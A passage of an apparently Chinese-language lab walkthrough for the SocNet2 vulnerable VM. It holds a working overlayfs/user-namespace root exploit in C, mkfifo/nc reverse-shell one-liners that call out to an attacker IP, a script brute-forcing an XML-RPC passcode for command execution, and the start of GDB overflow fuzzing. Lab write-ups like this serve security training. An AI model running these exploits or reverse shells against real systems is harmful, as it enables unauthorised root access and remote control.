class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, src);</span><br><span class="line">    <span class="keyword">if</span> ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, dst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> rd, wr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        rd = read(fi, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (rd == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rd == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read %s&quot;</span>, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p = buf;</span><br><span class="line">        <span class="keyword">while</span> (rd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            wr = write(fo, p, rd);</span><br><span class="line">            <span class="keyword">if</span> (wr == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, dst);</span><br><span class="line">            &#125;</span><br><span class="line">            p += wr;</span><br><span class="line">            rd -= wr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fi);</span><br><span class="line">    close(fo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;rm -rf &#x27;%s/&#x27;&quot;</span>, DIR_BASE);</span><br><span class="line">    system(buf);</span><br><span class="line"></span><br><span class="line">    xmkdir(DIR_BASE, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_WORK,  <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_LOWER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_UPPER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_MERGE, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;unshare&quot;</span>);</span><br><span class="line"></span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/uid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/gid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;</span>, DIR_LOWER, DIR_UPPER, DIR_WORK);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, DIR_MERGE, <span class="string">&quot;overlay&quot;</span>, <span class="number">0</span>, buf) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mount %s&quot;</span>, DIR_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// all+ep</span></span><br><span class="line">    <span class="keyword">char</span> cap[] = <span class="string">&quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    xcopyfile(<span class="string">&quot;/proc/self/exe&quot;</span>, BIN_MERGE, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (setxattr(BIN_MERGE, <span class="string">&quot;security.capability&quot;</span>, cap, <span class="keyword">sizeof</span>(cap) - <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;setxattr %s&quot;</span>, BIN_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;magic&quot;</span>) || (argc &gt; <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;shell&quot;</span>))) &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;--norc&quot;</span>, <span class="string">&quot;--noprofile&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;execl /bin/bash&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        _exit(exploit());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        waitpid(child, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(BIN_UPPER, BIN_UPPER, <span class="string">&quot;shell&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;execl %s&quot;</span>, BIN_UPPER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上传exploit.c到蚁剑，执行</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br><span class="line"></span><br><span class="line"><span class="meta">#发现报错</span></span><br><span class="line"><span class="symbol">bash:</span> cannot <span class="keyword">set</span> terminal process group (<span class="number">1301</span>): Inappropriate ioctl for device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash<span class="number">-4.4</span><span class="meta"># exit</span></span><br></pre></td></tr></table></figure>

<p>应该是蚁剑的shell问题。</p>
<p>所以我们反弹shell</p>
<h3 id="mkfifo反弹shell"><a href="#mkfifo反弹shell" class="headerlink" title="mkfifo反弹shell"></a>mkfifo反弹shell</h3><p>由于目标机的nc不支持-e参数，所以我们用mkfifo的堆栈操作实现反弹shell</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>f;cat <span class="regexp">/tmp/</span>f|<span class="regexp">/bin/</span>bash -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">172.16</span>.<span class="number">42.147</span> <span class="number">4444</span>&gt;<span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>

<p>kali监听执行</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#反弹shell监听</span></span><br><span class="line">[root<span class="variable">@kali</span> /tmp]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.205</span>: inverse host lookup <span class="symbol">failed:</span> Host name lookup failure</span><br><span class="line">connect to [<span class="number">172.16</span>.<span class="number">42.147</span>] from (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.205</span>] <span class="number">35606</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">1301</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前账号</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#python简单升级终端</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">&lt;sts<span class="variable">$ </span>python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞利用</span></span><br><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/var/www/html/data/images/posts</span><span class="variable">$ </span>./exploit</span><br><span class="line">./exploit</span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">1301</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash<span class="number">-4.4</span><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功提权。</p>
<h2 id="提权到socnet账号"><a href="#提权到socnet账号" class="headerlink" title="提权到socnet账号"></a>提权到socnet账号</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>进入socnet账号目录</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/home/socnet</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">add_record  monitor.py	peda</span><br></pre></td></tr></table></figure>

<p>查看monitor进程(web应用中管理员有提到该程序)</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@socnet<span class="number">2</span>:/home/socnet$ ps aux | grep monitor</span><br><span class="line"><span class="attribute">ps</span> aux | grep monitor</span><br><span class="line"><span class="attribute">socnet</span>    <span class="number">1088</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">4628</span>   <span class="number">780</span> ?        Ss   <span class="number">00</span>:<span class="number">56</span>   <span class="number">0</span>:<span class="number">00</span> /bin/sh -c /usr/bin/python /home/socnet/monitor.py</span><br><span class="line"><span class="attribute">socnet</span>    <span class="number">1094</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">1</span>.<span class="number">3</span>  <span class="number">42960</span> <span class="number">13252</span> ?        S    <span class="number">00</span>:<span class="number">56</span>   <span class="number">0</span>:<span class="number">02</span> /usr/bin/python /home/socnet/monitor.py</span><br></pre></td></tr></table></figure>



<p>monitor源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@socnet2</span><span class="symbol">:/home/socnet</span><span class="variable">$ </span>cat monitor.py</span><br><span class="line">cat monitor.py</span><br><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line">import SimpleXMLRPCServer</span><br><span class="line">import subprocess</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span><span class="params">(cmd)</span></span>:</span><br><span class="line">    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span><span class="params">()</span></span>:</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span><span class="params">(cmd,passcode)</span></span>:</span><br><span class="line">    <span class="keyword">if</span> passcode==<span class="symbol">debugging_pass:</span></span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>





<h3 id="编写xmlrpc-exploit"><a href="#编写xmlrpc-exploit" class="headerlink" title="编写xmlrpc exploit"></a>编写xmlrpc exploit</h3><p>查询<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/xmlrpc.server.html#simplexmlrpcserver-example%E5%AE%98%E6%96%B9client">https://docs.python.org/3/library/xmlrpc.server.html#simplexmlrpcserver-example官方client</a> demo</p>
<ul>
<li>client官方demo</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = xmlrpc.client.ServerProxy(&#x27;http://localhost:<span class="number">8000</span>&#x27;)</span><br><span class="line"><span class="attribute">print</span>(s.pow(<span class="number">2</span>,<span class="number">3</span>))  # Returns <span class="number">2</span>**<span class="number">3</span> = <span class="number">8</span></span><br><span class="line"><span class="attribute">print</span>(s.add(<span class="number">2</span>,<span class="number">3</span>))  # Returns <span class="number">5</span></span><br><span class="line"><span class="attribute">print</span>(s.mul(<span class="number">5</span>,<span class="number">2</span>))  # Returns <span class="number">5</span>*<span class="number">2</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print list of available methods</span></span><br><span class="line"><span class="attribute">print</span>(s.system.listMethods())</span><br></pre></td></tr></table></figure>

<p>我们只要实现客户端的xmlrpc，暴力破解debugging_pass，即可利用成功</p>
<p>尝试调用cpu方法。</p>
<ul>
<li>xmlclient.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line">s = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.cpu())  <span class="comment"># Returns 2**3 = 8</span></span><br></pre></td></tr></table></figure>



<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@kali /tmp]<span class="comment"># python3 xmlclient.py</span></span><br><span class="line"><span class="attribute">processor	</span>: 0</span><br><span class="line"><span class="attribute">vendor_id	</span>: GenuineIntel</span><br><span class="line"><span class="attribute">cpu family	</span>: 6</span><br><span class="line"><span class="attribute">model		</span>: 126</span><br><span class="line"><span class="attribute">model name	</span>: Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz</span><br><span class="line"><span class="attribute">stepping	</span>: 5</span><br><span class="line"><span class="attribute">cpu MHz		</span>: 1996.800</span><br><span class="line"><span class="attribute">cache size	</span>: 6144 KB</span><br></pre></td></tr></table></figure>



<p>执行成功。</p>
<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpc.<span class="keyword">client</span></span><br><span class="line"></span><br><span class="line">s = xmlrpc.<span class="keyword">client</span>.ServerProxy(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">	result = <span class="built_in">str</span>(s.secure_cmd(<span class="string">&#x27;id&#x27;</span>, p))</span><br><span class="line">	<span class="keyword">if</span> not <span class="string">&quot;Wrong&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">		<span class="keyword">print</span>(p)</span><br><span class="line">		<span class="keyword">print</span>(result)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@kali /tmp]# python3 xmlclient.py</span><br><span class="line">3599</span><br><span class="line"><span class="attribute">uid</span>=1000(socnet) <span class="attribute">gid</span>=1000(socnet) <span class="attribute">groups</span>=1000(socnet),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br></pre></td></tr></table></figure>



<h3 id="反弹脚本"><a href="#反弹脚本" class="headerlink" title="反弹脚本"></a>反弹脚本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpc<span class="selector-class">.client</span></span><br><span class="line"></span><br><span class="line">s = xmlrpc<span class="selector-class">.client</span><span class="selector-class">.ServerProxy</span>(<span class="string">&#x27;http://172.16.42.205:8000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.42.147 5555&gt;/tmp/f&quot;</span></span><br><span class="line">result = str(s<span class="selector-class">.secure_cmd</span>(cmd, <span class="number">3599</span>))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str(result)</span></span>)</span><br></pre></td></tr></table></figure>

<p>执行，收到反弹的shell</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@kali /tmp]<span class="comment"># python3 xmlclient.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听收到了socnet账号的shell</span></span><br><span class="line">[root@kali ~]<span class="comment"># nc -lvvp 5555</span></span><br><span class="line">listening <span class="literal">on</span> [any] <span class="number">5555</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.205</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect <span class="keyword">to</span> [<span class="number">172.16</span>.<span class="number">42.147</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.205</span>] <span class="number">38896</span></span><br><span class="line">bash: cannot set terminal process group (<span class="number">1088</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> <span class="built_in">this</span> shell</span><br><span class="line">socnet@socnet2:~$</span><br></pre></td></tr></table></figure>



<h3 id="python升级shell"><a href="#python升级shell" class="headerlink" title="python升级shell"></a>python升级shell</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>







<h2 id="使用GDB进行缓存区溢出漏洞挖掘"><a href="#使用GDB进行缓存区溢出漏洞挖掘" class="headerlink" title="使用GDB进行缓存区溢出漏洞挖掘"></a>使用GDB进行缓存区溢出漏洞挖掘</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看add_record的文件头</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socnet</span>@socnet<span class="number">2</span>:~$ file add_record</span><br><span class="line"><span class="attribute">file</span> add_record</span><br><span class="line"><span class="attribute">add_record</span>: setuid, setgid ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha<span class="number">1</span>]=e<span class="number">3</span>fa<span class="number">9</span>a<span class="number">66</span>b<span class="number">0</span>b<span class="number">1</span>e<span class="number">3281</span>ae<span class="number">09</span>b<span class="number">3</span>fb<span class="number">1</span>b<span class="number">7</span>b<span class="number">82</span>ff<span class="number">17972</span>d<span class="number">8</span>, not strippe</span><br></pre></td></tr></table></figure>

<p>查看文件权限</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">socnet@socnet2:~$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 16</span><br><span class="line">-rwsrwsr-x<span class="number"> 1 </span>root   socnet<span class="number"> 6952 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>add_record</span><br><span class="line">-rw-rw-r--<span class="number"> 1 </span>socnet socnet <span class="number"> 904 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>monitor.py</span><br><span class="line">drwxrwxr-x<span class="number"> 4 </span>socnet socnet<span class="number"> 4096 </span>Oct<span class="number"> 29 </span><span class="number"> 2018 </span>ped</span><br></pre></td></tr></table></figure>

<p>可以确定add_record开启了suid权限。文件权限为root。</p>
<p>PEDA - Python Exploit Development Assistance for GDB。peda是用来辅助gdb调试的python脚本。</p>
<h3 id="gdb调试进行缓冲区溢出漏洞挖掘"><a href="#gdb调试进行缓冲区溢出漏洞挖掘" class="headerlink" title="gdb调试进行缓冲区溢出漏洞挖掘"></a>gdb调试进行缓冲区溢出漏洞挖掘</h3><p>安静模式启动gdb</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -<span class="selector-tag">q</span> ./add_record</span><br></pre></td></tr></table></figure>

<p>执行<code>r</code>，程序加载执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> <span class="built_in">r</span></span><br></pre></td></tr></table></figure>

<p>另启一个终端，打印500个字符A</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># python -c <span class="string">&quot;print(&#x27;A&#x27;*500)&quot;</span></span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<p>复制A字符串，查看<code>Employee Name(char)</code>是否存在缓冲区溢出</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome <span class="keyword">to</span> <span class="keyword">Add</span> <span class="type">Record</span> application</span><br><span class="line">Use it <span class="keyword">to</span> <span class="keyword">add</span> <span class="keyword">info</span> about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">Employee <span class="type">Name</span>(<span class="type">char</span>): 